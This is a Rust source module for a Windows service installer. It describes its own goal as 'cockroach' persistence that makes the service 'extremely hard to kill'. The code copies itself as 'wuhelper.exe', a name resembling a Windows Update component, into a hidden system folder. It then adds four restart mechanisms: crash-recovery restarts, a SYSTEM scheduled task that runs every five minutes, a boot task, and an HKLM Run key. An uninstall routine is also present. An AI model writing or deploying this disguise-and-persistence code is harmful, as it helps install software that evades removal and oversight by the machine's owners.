//! # Service Installer & Cockroach Persistence Module
//!
//! Handles Windows service lifecycle (install, uninstall, start, stop, restart, query)
//! and implements multi-layered persistence so the service is extremely hard to kill:
//!
//! 1. **Service failure recovery** — Windows auto-restarts the process within 1 second.
//! 2. **Watchdog scheduled task** — Every 5 minutes, re-starts the service if stopped.
//! 3. **Boot-time scheduled task** — Starts the service on every system boot.
//! 4. **Registry Run key** — Additional startup trigger via HKLM Run.

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::{io, mem, ptr, thread, time::Duration};

use winapi::shared::minwindef::{DWORD, FALSE, HKEY};
use winapi::shared::winerror::ERROR_SERVICE_DOES_NOT_EXIST;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::winbase::FILE_FLAG_BACKUP_SEMANTICS;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM, FILE_SHARE_READ, FILE_SHARE_WRITE,
    FILE_WRITE_ATTRIBUTES, GENERIC_READ, GENERIC_WRITE, KEY_SET_VALUE, REG_SZ,
};
use winapi::um::fileapi::SetFileAttributesW;
use winapi::um::winreg::{
    RegCloseKey, RegDeleteValueW, RegOpenKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE,
};
use winapi::um::winsvc::*;

use crate::config::{
    self, Config, DAILY_TASK_NAME, INSTALL_DIR_NAME, REGISTRY_VALUE_NAME, SERVICE_DESCRIPTION,
    SERVICE_DISPLAY_NAME, SERVICE_NAME, WATCHDOG_TASK_NAME,
};

use log::{error, info, warn};

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Full cockroach installation:
/// copies binary, creates service, sets failure recovery, scheduled tasks, registry key.
pub fn install() -> Result<(), Box<dyn std::error::Error>> {
    info!("Starting full installation...");

    // 1. Copy binary to install directory
    let install_dir = Config::install_dir();
    std::fs::create_dir_all(&install_dir)?;
    hide_directory(&install_dir)?;

    let exe_dest = install_dir.join("wuhelper.exe");
    let current_exe = std::env::current_exe()?;
    std::fs::copy(&current_exe, &exe_dest)?;
    info!("Binary copied to {}", exe_dest.display());

    // 2. Create Windows service
    create_windows_service(&exe_dest)?;
    info!("Windows service created");

    // 3. Set failure recovery (cockroach #1)
    set_failure_recovery()?;
    info!("Failure recovery configured");

    // 4. Create watchdog scheduled task (cockroach #2)
    create_watchdog_task()?;
    info!("Watchdog task created");

    // 5. Create boot-time scheduled task (cockroach #3)
    create_boot_task()?;
    info!("Boot task created");

    // 6. Registry Run key (cockroach #4)
    create_registry_run_key()?;
    info!("Registry Run key set");

    // 7. Start the service
    if let Err(e) = start_service() {
        warn!("Service created but failed to start: {}", e);
    } else {
        info!("Service started successfully");
    }

    Ok(())
}

/// Complete removal: stops service, deletes service, tasks, registry keys, files.
pub fn uninstall() -> Result<(), Box<dyn std::error::Error>> {
    info!("Starting full uninstallation...");

    // 1. Stop the service (ignore errors — it may already be stopped)
    let _ = stop_service();
    // Give it a moment to fully stop
    thread::sleep(Duration::from_secs(1));

    // 2. Delete the Windows service
    delete_windows_service()?;
    info!("Windows service deleted");

    // 3. Remove scheduled tasks
    remove_scheduled_tasks();
    info!("Scheduled tasks removed");

    // 4. Remove registry Run key
    remove_registry_run_key();
    info!("Registry Run key removed");

    // 5. Delete installation directory
    let install_dir = Config::install_dir();
    if install_dir.exists() {
        // Clear hidden/system attributes so we can delete
        let dir_w = to_wstring(&install_dir.to_string_lossy());
        unsafe {
            SetFileAttributesW(dir_w.as_ptr(), winapi::um::winnt::FILE_ATTRIBUTE_NORMAL);
        }
        if let Err(e) = std::fs::remove_dir_all(&install_dir) {
            warn!("Failed to remove install dir: {}", e);
        } else {
            info!("Install directory removed");
        }
    }

    Ok(())
}

/// Start the Windows service via the Service Control Manager.
pub fn start_service() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let scm = open_scm(SC_MANAGER_CONNECT)?;
        let svc = open_service_handle(scm, SERVICE_START);
        if svc.is_null() {
            let err = GetLastError();
            CloseServiceHandle(scm);
            return Err(format!("Failed to open service for start (err {})", err).into());
        }

        let ok = StartServiceW(svc, 0, ptr::null_mut());
        let err = GetLastError();
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);

        if ok == 0 {
            // ERROR_SERVICE_ALREADY_RUNNING = 1056
            if err == 1056 {
                info!("Service is already running");
                return Ok(());
            }
            return Err(format!("StartServiceW failed (err {})", err).into());
        }
    }
    info!("Service start signal sent");
    Ok(())
}

/// Stop the Windows service via the Service Control Manager.
pub fn stop_service() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let scm = open_scm(SC_MANAGER_CONNECT)?;
        let svc = open_service_handle(scm, SERVICE_STOP | SERVICE_QUERY_STATUS);
        if svc.is_null() {
            let err = GetLastError();
            CloseServiceHandle(scm);
            return Err(format!("Failed to open service for stop (err {})", err).into());
        }

        let mut status: SERVICE_STATUS = mem::zeroed();
        let ok = ControlService(svc, SERVICE_CONTROL_STOP, &mut status);
        let err = GetLastError();
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);

        if ok == 0 {
            // ERROR_SERVICE_NOT_ACTIVE = 1062
            if err == 1062 {
                info!("Service is already stopped");
                return Ok(());
            }
            return Err(format!("ControlService STOP failed (err {})", err).into());
        }
    }
    info!("Service stop signal sent");
    Ok(())
}

/// Restart the service: stop → wait 2s → start.
pub fn restart_service() -> Result<(), Box<dyn std::error::Error>> {
    let _ = stop_service(); // ignore if already stopped
    thread::sleep(Duration::from_secs(2));
    start_service()
}

/// Query the current service status and return a human-readable string.
pub fn query_service_status() -> Result<String, Box<dyn std::error::Error>> {
    unsafe {
        let scm = open_scm(SC_MANAGER_CONNECT)?;
        let svc = open_service_handle(scm, SERVICE_QUERY_STATUS);
        if svc.is_null() {
            let err = GetLastError();
            CloseServiceHandle(scm);
            if err == ERROR_SERVICE_DOES_NOT_EXIST {
                return Ok("Not Installed".to_string());
            }
            return Err(format!("Failed to open service for query (err {})", err).into());
        }

        let mut status: SERVICE_STATUS = mem::zeroed();
        let ok = QueryServiceStatus(svc, &mut status);
        let err = GetLastError();
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);

        if ok == 0 {
            return Err(format!("QueryServiceStatus failed (err {})", err).into());
        }

        let state_str = match status.dwCurrentState {
            SERVICE_STOPPED => "Stopped",
            SERVICE_START_PENDING => "Starting...",
            SERVICE_STOP_PENDING => "Stopping...",
            SERVICE_RUNNING => "Running",
            SERVICE_CONTINUE_PENDING => "Resuming...",
            SERVICE_PAUSE_PENDING => "Pausing...",
            SERVICE_PAUSED => "Paused",
            _ => "Unknown",
        };

        Ok(state_str.to_string())
    }
}

/// Returns true if the service is registered in the Service Control Manager.
pub fn is_installed() -> bool {
    unsafe {
        let scm = match open_scm(SC_MANAGER_CONNECT) {
            Ok(h) => h,
            Err(_) => return false,
        };
        let svc = open_service_handle(scm, SERVICE_QUERY_STATUS);
        let installed = !svc.is_null();
        if installed {
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
        installed
    }
}

/// Returns true if the service is currently running.
pub fn is_running() -> bool {
    match query_service_status() {
        Ok(s) => s == "Running",
        Err(_) => false,
    }
}

// ---------------------------------------------------------------------------
// SCM helpers
// ---------------------------------------------------------------------------

/// Open the Service Control Manager with the requested access rights.
unsafe fn open_scm(access: DWORD) -> Result<SC_HANDLE, Box<dyn std::error::Error>> {
    let scm = OpenSCManagerW(ptr::null(), ptr::null(), access);
    if scm.is_null() {
        let err = GetLastError();
        return Err(format!("OpenSCManagerW failed (err {}). Run as Administrator.", err).into());
    }
    Ok(scm)
}

/// Open a handle to our service by name. Returns null on failure (caller checks).
unsafe fn open_service_handle(scm: SC_HANDLE, access: DWORD) -> SC_HANDLE {
    let name_w = to_wstring(SERVICE_NAME);
    OpenServiceW(scm, name_w.as_ptr(), access)
}

// ---------------------------------------------------------------------------
// Install helpers
// ---------------------------------------------------------------------------

/// Create the Windows service via SCM.
fn create_windows_service(exe_path: &std::path::Path) -> Result<(), Box<dyn std::error::Error>> {
    let binary_path = format!("\"{}\" --service", exe_path.display());
    let name_w = to_wstring(SERVICE_NAME);
    let display_w = to_wstring(SERVICE_DISPLAY_NAME);
    let binary_w = to_wstring(&binary_path);
    let desc_str = to_wstring(SERVICE_DESCRIPTION);

    unsafe {
        let scm = open_scm(SC_MANAGER_CREATE_SERVICE)?;

        let svc = CreateServiceW(
            scm,
            name_w.as_ptr(),
            display_w.as_ptr(),
            SERVICE_ALL_ACCESS,
            winapi::um::winnt::SERVICE_WIN32_OWN_PROCESS,
            winapi::um::winnt::SERVICE_AUTO_START,
            winapi::um::winnt::SERVICE_ERROR_NORMAL,
            binary_w.as_ptr(),
            ptr::null(),     // no load order group
            ptr::null_mut(), // no tag id
            ptr::null(),     // no dependencies
            ptr::null(),     // LocalSystem account
            ptr::null(),     // no password
        );

        if svc.is_null() {
            let err = GetLastError();
            CloseServiceHandle(scm);
            // ERROR_SERVICE_EXISTS = 1073
            if err == 1073 {
                info!("Service already exists, skipping creation");
                return Ok(());
            }
            return Err(format!("CreateServiceW failed (err {})", err).into());
        }

        // Set description
        let mut desc = SERVICE_DESCRIPTIONW {
            lpDescription: desc_str.as_ptr() as *mut u16,
        };
        ChangeServiceConfig2W(
            svc,
            SERVICE_CONFIG_DESCRIPTION,
            &mut desc as *mut _ as *mut _,
        );

        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
    }

    Ok(())
}

/// Configure automatic failure recovery — restarts the service on crash.
fn set_failure_recovery() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let scm = open_scm(SC_MANAGER_CONNECT)?;
        let name_w = to_wstring(SERVICE_NAME);
        let svc = OpenServiceW(scm, name_w.as_ptr(), SERVICE_ALL_ACCESS);
        if svc.is_null() {
            let err = GetLastError();
            CloseServiceHandle(scm);
            return Err(format!("Cannot open service for config (err {})", err).into());
        }

        // Three restart actions with escalating delays: 1s, 5s, 10s
        let mut actions = [
            SC_ACTION {
                Type: SC_ACTION_RESTART,
                Delay: 1_000,  // 1 second
            },
            SC_ACTION {
                Type: SC_ACTION_RESTART,
                Delay: 5_000,  // 5 seconds
            },
            SC_ACTION {
                Type: SC_ACTION_RESTART,
                Delay: 10_000, // 10 seconds
            },
        ];

        let mut failure_actions = SERVICE_FAILURE_ACTIONSW {
            dwResetPeriod: 3600, // reset failure counter after 1 hour
            lpRebootMsg: ptr::null_mut(),
            lpCommand: ptr::null_mut(),
            cActions: actions.len() as u32,
            lpsaActions: actions.as_mut_ptr(),
        };

        let ok = ChangeServiceConfig2W(
            svc,
            SERVICE_CONFIG_FAILURE_ACTIONS,
            &mut failure_actions as *mut _ as *mut _,
        );
        let err = GetLastError();

        CloseServiceHandle(svc);
        CloseServiceHandle(scm);

        if ok == 0 {
            return Err(format!("ChangeServiceConfig2W failed (err {})", err).into());
        }
    }

    Ok(())
}

/// Create a watchdog scheduled task that runs every 5 minutes.
fn create_watchdog_task() -> Result<(), Box<dyn std::error::Error>> {
    let cmd = format!("net start {}", SERVICE_NAME);
    let output = std::process::Command::new("schtasks")
        .args([
            "/create",
            "/tn", WATCHDOG_TASK_NAME,
            "/tr", &cmd,
            "/sc", "minute",
            "/mo", "5",
            "/ru", "SYSTEM",
            "/rl", "HIGHEST",
            "/f",
        ])
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        warn!("Watchdog task creation warning: {}", stderr);
    }
    Ok(())
}

/// Create a boot-time scheduled task that starts the service at system startup.
fn create_boot_task() -> Result<(), Box<dyn std::error::Error>> {
    let cmd = format!("net start {}", SERVICE_NAME);
    let output = std::process::Command::new("schtasks")
        .args([
            "/create",
            "/tn", DAILY_TASK_NAME,
            "/tr", &cmd,
            "/sc", "onstart",
            "/ru", "SYSTEM",
            "/rl", "HIGHEST",
            "/f",
        ])
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        warn!("Boot task creation warning: {}", stderr);
    }
    Ok(())
}

/// Set HKLM\..\Run registry value so `net start` fires at user logon.
fn create_registry_run_key() -> Result<(), Box<dyn std::error::Error>> {
    let sub_key = to_wstring("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    let value_name = to_wstring(REGISTRY_VALUE_NAME);
    let value_data = to_wstring(&format!("net start {}", SERVICE_NAME));

    unsafe {
        let mut hkey: HKEY = ptr::null_mut();
        let res = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );
        if res != 0 {
            return Err(format!("RegOpenKeyExW failed (err {})", res).into());
        }

        // Data length in bytes, including the null terminator (already in value_data)
        let byte_len = (value_data.len() * 2) as u32;
        let res = RegSetValueExW(
            hkey,
            value_name.as_ptr(),
            0,
            REG_SZ,
            value_data.as_ptr() as *const u8,
            byte_len,
        );
        RegCloseKey(hkey);

        if res != 0 {
            return Err(format!("RegSetValueExW failed (err {})", res).into());
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Uninstall helpers
// ---------------------------------------------------------------------------

/// Delete the Windows service from SCM.
fn delete_windows_service() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let scm = open_scm(SC_MANAGER_CONNECT)?;
        let name_w = to_wstring(SERVICE_NAME);
        let svc = OpenServiceW(scm, name_w.as_ptr(), winapi::um::winnt::DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS);
        if svc.is_null() {
            let err = GetLastError();
            CloseServiceHandle(scm);
            if err == ERROR_SERVICE_DOES_NOT_EXIST {
                return Ok(()); // already gone
            }
            return Err(format!("Cannot open service for deletion (err {})", err).into());
        }

        if DeleteService(svc) == 0 {
            let err = GetLastError();
            // ERROR_SERVICE_MARKED_FOR_DELETE = 1072 — acceptable
            if err != 1072 {
                CloseServiceHandle(svc);
                CloseServiceHandle(scm);
                return Err(format!("DeleteService failed (err {})", err).into());
            }
        }

        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
    }
    Ok(())
}

/// Remove both scheduled tasks, ignoring errors if they don't exist.
fn remove_scheduled_tasks() {
    for task_name in &[WATCHDOG_TASK_NAME, DAILY_TASK_NAME] {
        let _ = std::process::Command::new("schtasks")
            .args(["/delete", "/tn", task_name, "/f"])
            .output();
    }
}

/// Remove the HKLM Run registry value.
fn remove_registry_run_key() {
    let sub_key = to_wstring("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    let value_name = to_wstring(REGISTRY_VALUE_NAME);

    unsafe {
        let mut hkey: HKEY = ptr::null_mut();
        let res = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );
        if res != 0 {
            warn!("Could not open Run key for cleanup (err {})", res);
            return;
        }
        RegDeleteValueW(hkey, value_name.as_ptr());
        RegCloseKey(hkey);
    }
}

/// Set hidden + system attributes on the installation directory.
fn hide_directory(path: &std::path::Path) -> Result<(), Box<dyn std::error::Error>> {
    let path_w = to_wstring(&path.to_string_lossy());
    unsafe {
        if SetFileAttributesW(path_w.as_ptr(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
            == FALSE
        {
            let err = GetLastError();
            warn!("SetFileAttributesW failed (err {})", err);
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Utility
// ---------------------------------------------------------------------------

/// Encode a Rust string as a null-terminated wide (UTF-16) string for Win32 APIs.
fn to_wstring(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}
